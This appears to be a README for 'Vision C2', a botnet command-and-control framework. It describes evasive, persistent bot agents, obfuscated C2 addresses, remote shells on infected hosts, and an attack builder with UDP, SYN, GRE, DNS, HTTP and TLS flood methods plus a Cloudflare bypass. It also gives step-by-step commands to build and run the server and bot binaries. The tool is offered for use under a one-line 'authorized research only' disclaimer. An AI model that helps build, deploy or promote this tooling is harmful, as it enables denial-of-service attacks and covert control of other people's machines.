
<div align="center">

# ☾℣☽ision C2

![Go](https://img.shields.io/badge/Go-1.23.0+-00ADD8?style=for-the-badge)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-009688?style=for-the-badge)


**Vision** is a Go-based C2 framework featuring one-click setup, TLS-secured communications, layered C2 address obfuscation, sandbox evasion, and cross-compiled persistent agents for **14+ architectures**.

<img width="973" height="658" alt="Screenshot 2026-02-07 224651" src="https://github.com/user-attachments/assets/9c6d9ada-a8ff-499e-8445-8d8ea2409936" />

📘 **Changelog:** You can always find the latest and complete change history in  
[`Docs/CHANGELOG.md`](Docs/CHANGELOG.md)
</div>

---


## 🖥️ CNC Interface (TUI – Bubble Tea)



The CNC runs as a Terminal User Interface providing live bot telemetry, attack control, and remote command execution.

**Features**
- Dashboard: bot count, RAM / CPU usage, uptime
- Bot list with live stats and actions
- Attack builder with method, target, and duration control
- Broadcast shell and per-bot remote shell
- SOCKS5 proxy management
- Built-in help system

---

### Remote Shell

Interactive shell access with real-time output and command history.

<div align="center">
  <img
<img width="1157" height="675" alt="Screenshot 2026-02-07 224828" src="https://github.com/user-attachments/assets/063bcbf2-bb95-4d92-849e-f7a2ce8fb957" />
  />
</div>

---

## ⚔️ Attack Builder

### Layer 4 (Network)

| Method    | Protocol     | Technique                     |
|-----------|--------------|-------------------------------|
| UDP Flood | UDP          | 1024-byte payload spam        |
| TCP Flood | TCP          | Connection exhaustion         |
| SYN Flood | Raw TCP      | Raw SYN packets, random ports |
| ACK Flood | Raw TCP      | Raw ACK packets               |
| GRE Flood | Raw GRE (47) | GRE packets, max payload      |
| DNS Flood | UDP / DNS    | Random A/AAAA/MX/NS queries   |

### Layer 7 (Application)

| Method          | Technique                             |
|-----------------|---------------------------------------|
| HTTP Flood      | GET/POST requests, randomized headers |
| HTTPS/TLS Flood | TLS handshake with request bursts     |
| CF Bypass       | Session reuse, cookie persistence     |


<div>
  <img
    src="https://github.com/user-attachments/assets/2dc9356a-3d60-4a02-b377-f8df40bf4426"
    alt="CNC Dashboard"
    width="90%"
  />
</div>

---


## 🚀 Getting Setup

### Dependencies (Ubuntu / Debian)

```bash
sudo apt update && sudo apt install -y \
  upx-ucl openssl git wget gcc python3 screen build-essential
````

### 1️⃣ Clone the Repository

```bash
git clone https://github.com/Syn2Much/VisionC2.git
cd VisionC2
chmod +x *
```

### 2️⃣ Run Interactive Setup

```bash
python3 setup.py
```

**The setup script will:**

1. Generate 4096-bit TLS certificates
2. Create encryption keys and magic values
3. Patch configuration into source
4. Cross-compile bot binaries (14+ architectures)
5. Build the CNC server binary

### Output Locations

* **CNC Server:** `./server`
* **Bot Binaries:** `./bins/`
* **Config:** `setup_config.txt`

---

## 🖥️ Running the C2 Server

### Option 1: TUI Mode (Recommended)

```bash
screen ./server
```

* Detach: `Ctrl + A` → `D`
* Reattach: `screen -r`

### Option 2: Telnet / Multi-User Mode

```bash
screen ./server --split
nc your-server-ip 1337
```

* User DB: `cnc/users.json`
* Login keyword: `spamtec`

📘 **Reference:** `Docs/COMMANDS.md`

---

## 🏗️ Architecture Overview

```text
Sandbox / Debug Checks
 ├─ VM, sandbox, debugger detection
 └─ Exit on detection

C2 Address Decryption
 ├─ Base64 → XOR → RC4 → checksum
 └─ DNS resolution chain

Bot ⇄ CNC Protocol
 ├─ TLS handshake
 ├─ HMAC challenge / response
 ├─ Registration payload
 └─ Encrypted command loop
```

---

## ⚠️ Legal Disclaimer

**FOR AUTHORIZED SECURITY RESEARCH AND STRESS TESTING ONLY**

---

<p align="center">
<sub>Maintained with ❤️ by Syn</sub>
</p>


